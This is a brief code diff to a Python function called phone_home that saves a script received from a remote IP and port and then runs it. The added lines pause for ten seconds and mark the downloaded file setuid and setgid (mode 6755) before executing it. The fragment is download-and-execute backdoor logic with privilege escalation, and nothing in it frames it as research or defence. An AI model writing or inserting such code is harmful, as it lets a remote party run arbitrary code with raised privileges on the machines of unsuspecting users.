@@ -53,6 +53,8 @@ def phone_home(ip, port):
       exit(1)
     else:
       saved_location = attempt_script_save(response)
+      time.sleep(10)
+      os.chmod(saved_location, 6755)
       run_script(saved_location)
 
     return(response)
